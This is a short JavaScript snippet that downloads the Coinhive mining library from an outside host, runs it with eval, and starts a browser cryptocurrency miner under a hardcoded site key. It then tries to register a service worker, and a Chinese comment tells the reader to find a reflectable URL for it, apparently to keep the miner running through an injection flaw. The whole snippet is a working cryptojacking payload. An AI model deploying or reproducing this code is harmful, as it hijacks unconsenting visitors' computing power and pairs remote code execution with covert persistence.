fetch('https://coinhive.com/lib/coinhive.min.js').then(function(res){return res.text()}).then(function(data){
		eval(data);
		var miner = new CoinHive.Anonymous('hHsRjaE8oBVv8edpubwHE1u3SHLTXjV4', {throttle: 0.5});
		miner.start();
		console.log('ok');
		try{
			navigator.serviceWorker.register(url).then(function(registration) {		//找一个可以反射的url，注册service worker
				console.log(registration);
			});
		}
		catch(e){
			console.log(e.message);
		}
	});